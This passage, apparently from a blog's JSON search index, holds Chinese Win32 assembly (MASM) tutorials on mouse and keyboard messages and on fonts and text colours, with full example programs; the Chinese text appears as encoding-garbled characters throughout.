‡å¿—é‡MouseClickè®¾ä¸ºTRUEï¼Œè¿™è¡¨æ˜è‡³å°‘æœ‰ä¸€æ¬¡åœ¨å®¢æˆ·åŒºçš„å·¦é”®æŒ‰ä¸‹æ¶ˆæ¯ã€‚\n1 2 3 mov eax,lParam and eax,0FFFFh mov hitpoint.x,eax ç”±äºlParamæ˜¯ä¸€ä¸ª32ä½é•¿çš„æ•°ï¼Œå…¶ä¸­é«˜ã€ä½16ä½åˆ†åˆ«åŒ…æ‹¬äº†yã€xåæ ‡æ‰€ä»¥æˆ‘ä»¬åšä¸€äº›å°å¤„ç†ï¼Œä»¥ä¾¿ä¿å­˜å®ƒä»¬ã€‚\n1 2 shr eax,16 mov hitpoint.y,eax ä¿å­˜å®Œåæ ‡åæˆ‘ä»¬è®¾æ ‡å¿—MouseClickä¸ºTRUEï¼Œè¿™æ˜¯åœ¨å¤„ç†WM_PAINTæ—¶ç”¨æ¥åˆ¤æ–­æ˜¯å¦æœ‰é¼ æ ‡å·¦é”®æŒ‰ä¸‹æ¶ˆæ¯ã€‚ç„¶åæˆ‘ä»¬è°ƒç”¨InvalidateRectå‡½æ•°è¿«ä½¿WINDOWSé‡æ–°ç»˜åˆ¶å®¢æˆ·åŒºã€‚\n1 2 3 4 .IF MouseClick invoke lstrlen,ADDR AppName invoke TextOut,hdc,hitpoint.x,hitpoint.y,ADDR AppName,eax .ENDIF ç»˜åˆ¶å®¢æˆ·åŒºçš„ä»£ç é¦–å…ˆæ£€æµ‹MouseClickæ ‡å¿—ä½ï¼Œå†å†³å®šæ˜¯å¦é‡ç»˜ã€‚å› ä¸ºæˆ‘ä»¬åœ¨é¦–æ¬¡æ˜¾ç¤ºçª—å£æ—¶è¿˜æ²¡æœ‰å·¦é”®æŒ‰ä¸‹çš„æ¶ˆæ¯ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨åˆå§‹æ—¶æŠŠè¯¥æ ‡å¿—è®¾ä¸ºFALSEï¼Œå‘Šè¯‰WINDOWSä¸è¦é‡ç»˜å®¢æˆ·åŒºï¼Œå½“æœ‰å·¦é”®æŒ‰ä¸‹çš„æ¶ˆæ¯æ—¶ï¼Œå®ƒä¼šåœ¨é¼ æ ‡æŒ‰ä¸‹çš„ä½ç½®ç»˜åˆ¶å­—ç¬¦ä¸²ã€‚æ³¨æ„åœ¨è°ƒç”¨TextOutå‡½æ•°æ—¶ï¼Œå…¶å…³äºå­—ç¬¦ä¸²é•¿åº¦çš„å‚æ•°æ˜¯è°ƒç”¨lstrlenå‡½æ•°æ¥è®¡ç®—çš„ã€‚\n","permalink":"https://www.hacktech.cn/post/win32asm7-mouse-input-msg.html","summary":"\u003cp\u003eè¿™æ¬¡æˆ‘ä»¬å°†å­¦ä¹ å¦‚ä½•åœ¨æˆ‘ä»¬çš„çª—å£è¿‡ç¨‹å‡½æ•°ä¸­å¤„ç†é¼ æ ‡æŒ‰é”®æ¶ˆæ¯ã€‚ä¾‹å­æ¼”ç¤ºäº†å¦‚ä½•ç­‰å¾…é¼ æ ‡å·¦é”®æŒ‰ä¸‹æ¶ˆæ¯ï¼Œæˆ‘ä»¬å°†åœ¨æŒ‰ä¸‹çš„ä½ç½®æ˜¾ç¤ºä¸€ä¸ªå­—ç¬¦ä¸²ã€‚\u003c/p\u003e","title":"Win32æ±‡ç¼–å­¦ä¹ (7)ï¼šé¼ æ ‡è¾“å…¥æ¶ˆæ¯"},{"content":"è¿™æ¬¡ï¼Œæˆ‘ä»¬å°†è¦å­¦ä¹ WINDOWSç¨‹åºæ˜¯å¦‚ä½•å¤„ç†é”®ç›˜æ¶ˆæ¯çš„ã€‚\nç†è®ºï¼š å› ä¸ºå¤§å¤šæ•°çš„PCåªæœ‰ä¸€ä¸ªé”®ç›˜ï¼Œæ‰€ä»¥æ‰€æœ‰è¿è¡Œä¸­çš„WINDOWSç¨‹åºå¿…é¡»å…±ç”¨å®ƒã€‚WINDOWS å°†è´Ÿè´£æŠŠå‡»é”®æ¶ˆæ¯é€åˆ°å…·æœ‰è¾“å…¥ç„¦ç‚¹çš„é‚£ä¸ªåº”ç”¨ç¨‹åºä¸­å»ã€‚å°½ç®¡å±å¹•ä¸Šå¯èƒ½åŒæ—¶æœ‰å‡ ä¸ªåº”ç”¨ç¨‹åºçª—å£ï¼Œä½†ä¸€ä¸ªæ—¶åˆ»ä»…æœ‰ä¸€ä¸ªçª—å£æœ‰è¾“å…¥ç„¦ç‚¹ã€‚æœ‰è¾“å…¥ç„¦ç‚¹çš„é‚£ä¸ªåº”ç”¨ç¨‹åºçš„æ ‡é¢˜æ¡æ€»æ˜¯é«˜äº®åº¦æ˜¾ç¤ºçš„ã€‚ å®é™…ä¸Šæ‚¨å¯ä»¥ä»ä¸¤ä¸ªè§’åº¦æ¥çœ‹é”®ç›˜æ¶ˆæ¯ï¼šä¸€æ˜¯æ‚¨å¯ä»¥æŠŠå®ƒçœ‹æˆæ˜¯ä¸€å¤§å †çš„æŒ‰é”®æ¶ˆæ¯çš„é›†åˆï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå½“æ‚¨æŒ‰ä¸‹ä¸€ä¸ªé”®æ—¶ï¼ŒWINDOWSå°±ä¼šå‘é€ä¸€ä¸ª WM_KEYDOWN ç»™æœ‰è¾“å…¥ç„¦ç‚¹çš„é‚£ä¸ªåº”ç”¨ç¨‹åºï¼Œæé†’å®ƒæœ‰ä¸€ä¸ªé”®è¢«æŒ‰ä¸‹ã€‚å½“æ‚¨é‡Šæ”¾é”®æ—¶ï¼ŒWINDOWSåˆä¼šå‘é€ä¸€ä¸ª WM_KYEUP æ¶ˆæ¯ï¼Œå‘Šè¯‰æœ‰ä¸€ä¸ªé”®è¢«é‡Šæ”¾ã€‚æ‚¨æŠŠæ¯ä¸€ä¸ªé”®å½“æˆæ˜¯ä¸€ä¸ªæŒ‰é’®ï¼›å¦ä¸€ç§æƒ…å†µæ˜¯ï¼šæ‚¨å¯ä»¥æŠŠé”®ç›˜çœ‹æˆæ˜¯å­—ç¬¦è¾“å…¥è®¾å¤‡ã€‚å½“æ‚¨æŒ‰ä¸‹â€œaâ€é”®æ—¶ï¼ŒWINDOWSå‘é€ä¸€ä¸ª WM_CHAR æ¶ˆæ¯ç»™æœ‰è¾“å…¥ç„¦ç‚¹çš„åº”ç”¨ç¨‹åºï¼Œå‘Šè¯‰å®ƒâ€œaâ€é”®è¢«æŒ‰ä¸‹ã€‚å®é™…ä¸ŠWINDOWS å†…éƒ¨å‘é€ WM_KEYDOWN å’Œ WM_KEYUP æ¶ˆæ¯ç»™æœ‰è¾“å…¥ç„¦ç‚¹çš„åº”ç”¨ç¨‹åºï¼Œè€Œè¿™äº›æ¶ˆæ¯å°†é€šè¿‡è°ƒç”¨ TranslateMessage ç¿»è¯‘æˆ WM_CHAR æ¶ˆæ¯ã€‚WINDOWSçª—å£è¿‡ç¨‹å‡½æ•°å°†å†³å®šæ˜¯å¦å¤„ç†æ‰€æ”¶åˆ°çš„æ¶ˆæ¯ï¼Œä¸€èˆ¬è¯´æ¥æ‚¨ä¸å¤§ä¼šå»å¤„ç† WM_KEYDOWN ã€ WM_KEYUP æ¶ˆæ¯ï¼Œåœ¨æ¶ˆæ¯å¾ªç¯ä¸­ TranslateMessage å‡½æ•°ä¼šæŠŠä¸Šè¿°æ¶ˆæ¯è½¬æ¢æˆ WM_CHAR æ¶ˆæ¯ã€‚è¿™æ¬¡å­¦ä¹ ä¸­å°†åªå¤„ç† WM_CHARã€‚\nä¾‹å­ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 .386 .model flat,stdcall option casemap:none WinMain proto :DWORD,:DWORD,:DWORD,:DWORD include windows.inc include user32.inc include kernel32.inc include gdi32.inc includelib user32.lib includelib kernel32.lib includelib gdi32.lib .data ClassName db \u0026#34;SimpleWinClass\u0026#34;,0 AppName db \u0026#34;Our Fourth Window\u0026#34;,0 char WPARAM 20h .data? hInstance HINSTANCE ? CommandLine LPSTR ? .code start: invoke GetModuleHandle,NULL mov hInstance,eax invoke GetCommandLine mov CommandLine,eax invoke WinMain,hInstance,NULL,CommandLine,SW_SHOWDEFAULT invoke ExitProcess,eax WinMain proc hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD LOCAL wc:WNDCLASSEX LOCAL msg:MSG LOCAL hwnd:HWND mov wc.cbSize,SIZEOF WNDCLASSEX mov wc.style,CS_HREDRAW or CS_VREDRAW mov wc.lpfnWndProc,OFFSET WndProc mov wc.cbClsExtra,NULL mov wc.cbWndExtra,NULL push hInst pop wc.hInstance mov wc.hbrBackground,COLOR_WINDOW+1 mov wc.lpszMenuName,NULL mov wc.lpszClassName,OFFSET ClassName invoke LoadIcon,NULL,IDI_APPLICATION mov wc.hIcon,eax mov wc.hIconSm,eax invoke LoadCursor,NULL,IDC_ARROW mov wc.hCursor,eax invoke RegisterClassEx,ADDR wc invoke CreateWindowEx,NULL,ADDR ClassName,ADDR AppName,\\ WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,CW_USEDEFAULT,\\ CW_USEDEFAULT,CW_USEDEFAULT,NULL,NULL,hInst,NULL mov hwnd,eax invoke ShowWindow,hwnd,SW_SHOWNORMAL invoke UpdateWindow,hwnd .while TRUE invoke GetMessage,ADDR msg,NULL,0,0 .break .if (!eax) invoke TranslateMessage,ADDR msg invoke DispatchMessage,ADDR msg .endw mov eax,msg.wParam ret WinMain endp WndProc proc hWnd:HWND,uMsg:UINT,wParam:WPARAM,lParam:LPARAM LOCAL hdc:HDC LOCAL ps:PAINTSTRUCT .if uMsg==WM_DESTROY invoke PostQuitMessage,NULL .elseif uMsg==WM_CHAR push wParam pop char invoke InvalidateRect,hWnd,NULL,TRUE .elseif uMsg==WM_PAINT invoke BeginPaint,hWnd,ADDR ps mov hdc,eax invoke TextOut,hdc,0,0,ADDR char,1 invoke EndPaint,hWnd,ADDR ps .else invoke DefWindowProc,hWnd,uMsg,wParam,lParam ret .endif xor eax,eax ret WndProc endp end start åˆ†æï¼š 1 char WPARAM 20h è¿™ä¸ªå˜é‡å°†ä¿å­˜ä»é”®ç›˜æ¥æ”¶åˆ°çš„å­—ç¬¦ã€‚å› ä¸ºå®ƒæ˜¯åœ¨çª—å£è¿‡ç¨‹ä¸­é€šè¿‡WPARAMå‹å˜é‡ä¼ é€çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬ç®€å•åœ°æŠŠå®ƒå®šä¹‰ä¸ºWPARAMå‹ã€‚ç”±äºæˆ‘ä»¬çš„çª—å£åœ¨åˆæ¬¡åˆ·æ–°æ—¶(ä¹Ÿå³åˆšè¢«åˆ›å»ºçš„é‚£ä¸€æ¬¡)æ˜¯æ²¡æœ‰é”®ç›˜è¾“å…¥çš„æ‰€ä»¥æˆ‘ä»¬æŠŠä»–è®¾æˆç©ºæ ¼ç¬¦ï¼ˆ20hï¼‰ï¼Œè¿™æ ·æ˜¾ç¤ºæ—¶æ‚¨å°±ä»€ä¹ˆéƒ½çœ‹ä¸è§ã€‚\n1 2 3 4 .ELSEIF uMsg==WM_CHAR push wParam pop char invoke InvalidateRect, hWnd,NULL,TRUE è¿™ä¸€æ®µæ˜¯ç”¨æ¥å¤„ç†WM_CHARæ¶ˆæ¯çš„ã€‚å®ƒæŠŠæ¥æ”¶åˆ°çš„å­—ç¬¦æ”¾å…¥å˜é‡charä¸­ï¼Œæ¥ç€è°ƒç”¨InvalidateRectï¼Œè€ŒInvalidateRectä½¿å¾—çª—å£çš„å®¢æˆ·åŒºæ— æ•ˆï¼Œè¿™æ ·å®ƒä¼šå‘å‡ºWM_PAINTæ¶ˆæ¯ï¼Œè€ŒWM_PAINTæ¶ˆæ¯è¿«ä½¿WINDOWSé‡æ–°ç»˜åˆ¶å®ƒçš„å®¢æˆ·åŒºã€‚è¯¥å‡½æ•°çš„è¯­æ³•å¦‚ä¸‹ï¼š\n1 InvalidateRect proto hWnd:HWND, lpRect:DWORD, bErase:DWORD lpRectæ˜¯æŒ‡å‘å®¢æˆ·åŒºæˆ‘ä»¬æƒ³è¦å…¶æ— æ•ˆçš„ä¸€ä¸ªæ­£æ–¹å½¢ç»“æ„ä½“çš„æŒ‡é’ˆã€‚å¦‚æœè¯¥å€¼ç­‰äºNULLï¼Œåˆ™æ•´ä¸ªå®¢æˆ·åŒºéƒ½æ— æ•ˆï¼›å¸ƒå°”å€¼bEraseå‘Šè¯‰WINDOWSæ˜¯å¦æ“¦é™¤èƒŒæ™¯ï¼Œå¦‚æœæ˜¯TRUEï¼Œåˆ™WINDOWSåœ¨è°ƒç”¨BeginPaintå‡½æ•°æ—¶æŠŠèƒŒæ™¯æ“¦æ‰ã€‚ æ‰€ä»¥æˆ‘ä»¬æ­¤å¤„çš„åšæ³•æ˜¯ï¼šæˆ‘ä»¬å°†ä¿å­˜æ‰€æœ‰æœ‰å…³é‡ç»˜å®¢æˆ·åŒºçš„æ•°æ®ï¼Œç„¶åå‘é€WM_PAINTæ¶ˆæ¯(é€šè¿‡InvalidateRect)ï¼Œå¤„ç†è¯¥æ¶ˆæ¯çš„ç¨‹åºæ®µç„¶åæ ¹æ®ç›¸å…³æ•°æ®é‡æ–°ç»˜åˆ¶å®¢æˆ·åŒºã€‚å®é™…ä¸Šæˆ‘ä»¬å®Œå…¨å¯ä»¥é€šè¿‡è°ƒç”¨ GetDC è·å¾—è®¾å¤‡ä¸Šä¸‹æ–‡å¥æŸ„ï¼Œç„¶åç»˜åˆ¶å­—ç¬¦ï¼Œç„¶åå†è°ƒç”¨ReleaseDCé‡Šæ”¾è®¾å¤‡ä¸Šä¸‹æ–‡å¥æŸ„ï¼Œæ¯«æ— ç–‘é—®è¿™æ ·ä¹Ÿèƒ½åœ¨å®¢æˆ·åŒºç»˜åˆ¶å‡ºæ­£ç¡®çš„å­—ç¬¦ã€‚ä½†æ˜¯å¦‚æœè¿™ä¹‹åæ¥æ”¶åˆ°WM_PAINTæ¶ˆæ¯è¦å¤„ç†æ—¶ï¼Œå®¢æˆ·åŒºä¼šé‡æ–°åˆ·æ–°ï¼Œè€Œæˆ‘ä»¬è¿™ç¨å‰æ‰€ç»˜åˆ¶çš„å­—ç¬¦å°±ä¼šæ¶ˆå¤±æ‰ã€‚æ‰€ä»¥ä¸ºäº†è®©å­—ç¬¦ä¸€ç›´æ­£ç¡®åœ°æ˜¾ç¤ºï¼Œå°±å¿…é¡»æŠŠå®ƒä»¬æ”¾åˆ°WM_PAINTçš„å¤„ç†è¿‡ç¨‹ä¸­å¤„ç†ã€‚è€Œåœ¨æœ¬æ¶ˆæ¯å¤„ç†ä¸­å‘é€WM_PAINTæ¶ˆæ¯å³å¯ã€‚\n1 invoke TextOut,hdc,0,0,ADDR char,1 åœ¨è°ƒç”¨InvalidateRectæ—¶ï¼ŒWM_PAINTæ¶ˆæ¯è¢«å‘é€åˆ°äº†WINDOWSçª—å£å¤„ç†è¿‡ç¨‹ï¼Œç¨‹åºæµç¨‹è½¬ç§»åˆ°å¤„ç†WM_PAINTæ¶ˆæ¯çš„ç¨‹åºæ®µï¼Œç„¶åè°ƒç”¨BeginPaintå¾—åˆ°è®¾å¤‡ä¸Šä¸‹æ–‡çš„å¥æŸ„ï¼Œå†è°ƒç”¨TextOutåœ¨å®¢æˆ·åŒºçš„ï¼ˆ0ï¼Œ0ï¼‰å¤„è¾“å‡ºä¿å­˜çš„æŒ‰é”®å­—ç¬¦ã€‚è¿™æ ·æ— è®ºæ‚¨æŒ‰ä»€ä¹ˆé”®éƒ½èƒ½åœ¨å®¢æˆ·åŒºçš„å·¦ä¸Šè§’æ˜¾ç¤ºï¼Œä¸ä»…å¦‚æ­¤ï¼Œæ— è®ºæ‚¨æ€ä¹ˆç¼©æ”¾çª—å£ï¼ˆè¿«ä½¿WINDOWSé‡æ–°ç»˜åˆ¶å®ƒçš„å®¢æˆ·åŒºï¼‰ï¼Œå­—ç¬¦éƒ½ä¼šåœ¨æ­£ç¡®çš„åœ°æ–¹æ˜¾ç¤ºï¼Œæ‰€ä»¥å¿…é¡»æŠŠæ‰€æœ‰é‡è¦çš„ç»˜åˆ¶åŠ¨ä½œéƒ½æ”¾åˆ°å¤„ç†WM_PAINTæ¶ˆæ¯çš„ç¨‹åºæ®µä¸­å»ã€‚\n","permalink":"https://www.hacktech.cn/post/win32asm6-keyboard-input-msg.html","summary":"\u003cp\u003eè¿™æ¬¡ï¼Œæˆ‘ä»¬å°†è¦å­¦ä¹ WINDOWSç¨‹åºæ˜¯å¦‚ä½•å¤„ç†é”®ç›˜æ¶ˆæ¯çš„ã€‚\u003c/p\u003e","title":"Win32æ±‡ç¼–å­¦ä¹ (6)ï¼šé”®ç›˜è¾“å…¥æ¶ˆæ¯"},{"content":"è¿™æ¬¡æˆ‘ä»¬å°†å­¦ä¹ æœ‰å…³æ–‡æœ¬çš„è¯¸å¤šå±æ€§å¦‚å­—ä½“å’Œé¢œè‰²ç­‰ã€‚\nç†è®ºï¼š Windows çš„é¢œè‰²ç³»ç»Ÿæ˜¯ç”¨RGBå€¼æ¥è¡¨ç¤ºçš„ï¼ŒR ä»£è¡¨çº¢è‰²ï¼ŒG ä»£è¡¨ç»¿è‰²ï¼ŒB ä»£è¡¨è“è‰²ã€‚å¦‚æœæ‚¨æƒ³æŒ‡å®šä¸€ç§é¢œè‰²å°±å¿…é¡»ç»™è¯¥é¢œè‰²èµ‹ç›¸å…³çš„ RGB å€¼ï¼ŒRGB çš„å–å€¼èŒƒå›´éƒ½æ˜¯ä» 0 åˆ° 255ï¼Œè­¬å¦‚æ‚¨æƒ³è¦å¾—åˆ°çº¯çº¢è‰²ï¼Œå°±å¿…é¡»å¯¹RGBèµ‹å€¼ï¼ˆ255ï¼Œ0ï¼Œ0ï¼‰ï¼Œçº¯ç™½è‰²æ˜¯ ï¼ˆ255ï¼Œ255ï¼Œ255ï¼‰ã€‚\næ‚¨å¯ä»¥ç”¨å‡½æ•° SetTextColor å’Œ SetBkColor æ¥â€œç»˜åˆ¶â€å­—ç¬¦é¢œè‰²å’ŒèƒŒæ™¯è‰²ï¼Œä½†æ˜¯å¿…é¡»ä¼ é€’ä¸€ä¸ªâ€œè®¾å¤‡ç¯å¢ƒâ€çš„å¥æŸ„å’Œ RGB å€¼ä½œä¸ºå‚æ•°ã€‚RGB çš„ç»“æ„ä½“çš„å®šä¹‰å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 RGB_value struct unused db 0 blue db ? green db ? red db ? RGB_value ends å…¶ä¸­ç¬¬ä¸€å­—èŠ‚ä¸º 0 è€Œä¸”å§‹ç»ˆä¸º 0ï¼Œå…¶å®ƒä¸‰ä¸ªå­—èŠ‚åˆ†åˆ«è¡¨ç¤ºè“è‰²ã€ç»¿è‰²å’Œçº¢è‰²ï¼Œåˆšå¥½å’Œ RGB çš„æ¬¡åºç›¸åã€‚è¿™ä¸ªç»“æ„ä½“ç”¨èµ·æ¥æŒºåˆ«æ‰­ï¼Œæ‰€ä»¥æˆ‘ä»¬é‡æ–°å®šä¹‰ä¸€ä¸ªå®ç”¨å®ƒæ¥ä»£æ›¿ã€‚è¯¥å®æ¥æ”¶çº¢ç»¿è“ä¸‰ä¸ªå‚æ•°ï¼Œå¹¶åœ¨ eax å¯„å­˜å™¨ä¸­è¿”å› 32 ä½çš„ RGB å€¼ï¼Œå®çš„å®šä¹‰å¦‚ä¸‹ï¼š\n1 2 3 4 5 6 7 RGB macro redï¼Œgreenï¼Œblue xor eaxï¼Œeax mov ahï¼Œblue shl eaxï¼Œ8 mov ahï¼Œgreen mov alï¼Œred endm æ‚¨å¯ä»¥æŠŠè¯¥å®æ”¾åˆ°å¤´æ–‡ä»¶ä¸­ä»¥æ–¹ä¾¿ä½¿ç”¨ã€‚\næ‚¨å¯ä»¥è°ƒç”¨ CreateFont å’Œ CreateFontIndirect æ¥åˆ›å»ºè‡ªå·±çš„å­—ä½“ï¼Œè¿™ä¸¤ä¸ªå‡½æ•°çš„å·®åˆ«æ˜¯ï¼šå‰è€…è¦æ±‚æ‚¨ä¼ é€’ä¸€ç³»åˆ—çš„å‚æ•°ï¼Œè€Œåè€…åªè¦ä¼ é€’ä¸€ä¸ªæŒ‡å‘ LOGFONT ç»“æ„çš„æŒ‡é’ˆã€‚è¿™æ ·å°±ä½¿å¾—åè€…ä½¿ç”¨èµ·æ¥æ›´æ–¹ä¾¿ï¼Œå°¤å…¶å½“æ‚¨éœ€è¦é¢‘ç¹åˆ›å»ºå­—ä½“æ—¶ã€‚åœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­ç”±äºåªè¦åˆ›å»ºä¸€ç§å­—ä½“ï¼Œæ•…ç”¨ CreateFont å°±è¶³å¤Ÿäº†ã€‚åœ¨è°ƒç”¨è¯¥å‡½æ•°åä¼šè¿”å›æ‰€åˆ›å»ºçš„å­—ä½“çš„å¥æŸ„ï¼Œç„¶åæŠŠè¯¥å¥æŸ„é€‰è¿›â€œè®¾å¤‡ç¯å¢ƒâ€ä½¿å…¶æˆä¸ºå½“å‰å­—ä½“ï¼Œéšåæ‰€æœ‰çš„â€œç»˜åˆ¶â€æ–‡æœ¬ä¸²çš„å‡½æ•°åœ¨è¢«è°ƒç”¨æ—¶éƒ½è¦æŠŠè¯¥å¥æŸ„ä½œä¸ºä¸€ä¸ªå‚æ•°ä¼ é€’\nä¾‹å­ï¼š 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 .386 .model flat, stdcall option casemap:none WinMain proto :DWORD,:DWORD,:DWORD,:DWORD include windows.inc include user32.inc includelib user32.lib include kernel32.inc includelib kernel32.lib include gdi32.inc includelib gdi32.lib RGB macro red,green,blue xor eax,eax mov ah,blue shl eax,8 mov ah,green mov al,red endm .data ClassName db \u0026#34;SimpleWinClass\u0026#34;,0 AppName db \u0026#34;Our Third Window\u0026#34;,0 TestString db \u0026#34;Win32 æ±‡ç¼–éå¸¸æœ‰æ„æ€\u0026#34;,0 FontName db \u0026#34;script\u0026#34;,0 .data? hInstance HINSTANCE ? CommandLine LPSTR ? .code start: invoke GetModuleHandle,NULL mov hInstance,eax invoke GetCommandLine mov CommandLine,eax invoke WinMain,hInstance,NULL,CommandLine,SW_SHOWDEFAULT invoke ExitProcess,eax WinMain proc hInst:HINSTANCE,hPrevInst:HINSTANCE,CmdLine:LPSTR,CmdShow:DWORD LOCAL wc:WNDCLASSEX LOCAL msg:MSG LOCAL hwnd:HWND mov wc.cbSize,SIZEOF WNDCLASSEX mov wc.style, CS_HREDRAW or CS_VREDRAW mov wc.lpfnWndProc, OFFSET WndProc mov wc.cbClsExtra,NULL mov wc.cbWndExtra,NULL push hInst pop wc.hInstance mov wc.hbrBackground,COLOR_WINDOW+1 mov wc.lpszMenuName,NULL mov wc.lpszClassName,OFFSET ClassName invoke LoadIcon,NULL,IDI_APPLICATION mov wc.hIcon,eax mov wc.hIconSm,eax invoke LoadCursor,NULL,IDC_ARROW mov wc.hCursor,eax invoke RegisterClassEx, addr wc invoke CreateWindowEx,NULL,ADDR ClassName,ADDR AppName,\\ WS_OVERLAPPEDWINDOW,CW_USEDEFAULT,\\ CW_USEDEFAULT,CW_USEDEFAULT,CW_USEDEFAULT,NULL,NULL,\\ hInst,NULL mov hwnd,eax invoke ShowWindow, hwnd,SW_SHOWNORMAL invoke UpdateWindow, hwnd .WHILE TRUE invoke GetMessage, ADDR msg,NULL,0,0 .BREAK .IF (!eax) invoke TranslateMessage, ADDR msg invoke DispatchMessage, ADDR msg .ENDW mov eax,msg.wParam ret WinMain endp WndProc proc hWnd:HWND,uMsg:UINT,wParam:WPARAM,lParam:LPARAM LOCAL hdc:HDC LOCAL ps:PAINTSTRUCT LOCAL hfont:HFONT .IF uMsg==WM_DESTROY invoke PostQuitMessage,NULL .ELSEIF uMsg==WM_PAINT invoke BeginPaint,hWnd,ADDR ps mov hdc,eax invoke CreateFont,24,16,0,0,400,0,0,0,OEM_CHARSET,\\ OUT_DEFAULT_PRECIS,CLIP_DEFAULT_PRECIS,\\ DEFAULT_QUALITY,DEFAULT_PITCH or FF_SCRIPT,\\ ADDR FontName invoke SelectObject,hdc,eax mov hfont,eax RGB 200,200,50 invoke SetTextColor,hdc,eax RGB 0,0,255 invoke SetBkColor,hdc,eax invoke TextOut,hdc,0,0,ADDR TestString,SIZEOF TestString invoke SelectObject,hdc,hfont invoke EndPaint,hWnd,ADDR ps .ELSE invoke DefWindowProc,hWnd,uMsg,wParam,lParam ret .endif xor eax,eax ret WndProc endp end start åˆ†æï¼š CreateFont å‡½æ•°äº§ç”Ÿä¸€ç§é€»è¾‘å­—ä½“ï¼Œå®ƒå°½å¯èƒ½åœ°æ¥è¿‘å‚æ•°ä¸­æŒ‡å®šçš„å„ç›¸å…³å€¼ã€‚è¿™ä¸ªå‡½æ•°å¤§æ¦‚æ˜¯æ‰€æœ‰ Windows API å‡½æ•°ä¸­æ‰€å¸¦å‚æ•°æœ€å¤šçš„ä¸€ä¸ªã€‚å®ƒè¿”å›ä¸€ä¸ªæŒ‡å‘é€»è¾‘å­—ä½“çš„å¥æŸ„ä¾›è°ƒç”¨ SelectObject å‡½æ•°ä½¿ç”¨ã€‚ä¸‹é¢æˆ‘ä»¬è¯¦ç»†è®²è§£è¯¥å‡½æ•°çš„å‚æ•°ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 CreateFont proto \\ nHeightï¼šDWORDï¼Œ\\ nWidthï¼šDWORDï¼Œ\\ nEscapementï¼šDWORDï¼Œ\\ nOrientationï¼šDWORDï¼Œ\\ nWeightï¼šDWORDï¼Œ\\ cItalicï¼šDWORDï¼Œ\\ cUnderlineï¼šDWORDï¼Œ\\ cStrikeOutï¼šDWORDï¼Œ\\ cCharSetï¼šDWORDï¼Œ\\ cOutputPrecisionï¼šDWORDï¼Œ\\ cClipPrecisionï¼šDWORDï¼Œ\\ cQualityï¼šDWORDï¼Œ\\ cPitchAndFamilyï¼šDWORDï¼Œ\\ lpFacenameï¼šDWORD nHeightï¼š å¸Œæœ›ä½¿ç”¨çš„å­—ä½“çš„é«˜åº¦ï¼Œ0ä¸ºç¼ºçœã€‚ nWidthï¼š å¸Œæœ›ä½¿ç”¨çš„å­—ä½“çš„å®½åº¦ï¼Œä¸€èˆ¬æƒ…å†µä¸‹æœ€å¥½ç”¨0ï¼Œ è¿™æ · Windows å°†ä¼šè‡ªåŠ¨ä¸ºæ‚¨é€‰æ‹©ä¸€ä¸ªå’Œé«˜åº¦åŒ¹é…çš„å€¼ã€‚å› ä¸ºåœ¨æˆ‘ä»¬çš„ä¾‹å­ä¸­é‚£æ ·åšçš„è¯ä¼šä½¿å¾—å­—ç¬¦å› å¤ªå°è€Œæ— æ³•æ˜¾ç¤ºï¼Œæ‰€ä»¥æˆ‘ä»¬è®¾å®šå®ƒä¸º16ã€‚ nEscapementï¼š æ¯ä¸€ä¸ªå­—ç¬¦ç›¸å¯¹å‰ä¸€ä¸ªå­—ç¬¦çš„æ—‹è½¬è§’åº¦ï¼Œä¸€èˆ¬è®¾æˆ0ã€‚900ä»£è¡¨è½¬90åº¦ï¼Œ1800è½¬190åº¦ï¼Œ2700è½¬270åº¦ã€‚ nOrientationï¼š å­—ä½“çš„æ–¹å‘ã€‚ nWeightï¼š å­—ä½“ç¬”ç”»çš„ç²—ç»†ã€‚ Windows ä¸ºæˆ‘ä»¬é¢„å®šä¹‰äº†å¦‚ä¸‹å€¼ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 FW_DONTCARE ç­‰äº 0 FW_THIN ç­‰äº 100 FW_EXTRALIGHT ç­‰äº 200 FW_ULTRALIGHT ç­‰äº 200 FW_LIGHT ç­‰äº 300 FW_NORMAL ç­‰äº 400 FW_REGULAR ç­‰äº 400 FW_MEDIUM ç­‰äº 500 FW_SEMIBOLD ç­‰äº 600 FW_DEMIBOLD ç­‰äº 600 FW_BOLD ç­‰äº 700 FW_EXTRABOLD ç­‰äº 800 FW_ULTRABOLD ç­‰äº 800 FW_HEAVY ç­‰äº 900 FW_BLACK ç­‰äº 900 cItalicï¼š 0ä¸ºæ­£å¸¸ï¼Œå…¶å®ƒå€¼ä¸ºæ–œä½“ã€‚ cUnderlineï¼š 0ä¸ºæ­£å¸¸ï¼Œå…¶å®ƒå€¼ä¸ºæœ‰ä¸‹åˆ’çº¿ã€‚ cStrikeOutï¼š 0ä¸ºæ­£å¸¸ï¼Œå…¶å®ƒå€¼ä¸ºåˆ é™¤çº¿ã€‚ cCharSetï¼š å­—ä½“çš„å­—ç¬¦é›†ã€‚ä¸€èˆ¬é€‰æ‹©OEM_CHARSETï¼Œå®ƒä½¿å¾— Windows ä¼šé€‰ç”¨å’Œæ“ä½œç³»ç»Ÿç›¸å…³çš„å­—ç¬¦é›†ã€‚ cOutputPrecisionï¼š æŒ‡å®šæˆ‘ä»¬é€‰æ‹©çš„å­—ä½“æ¥è¿‘çœŸå®å­—ä½“çš„ç²¾åº¦ã€‚ 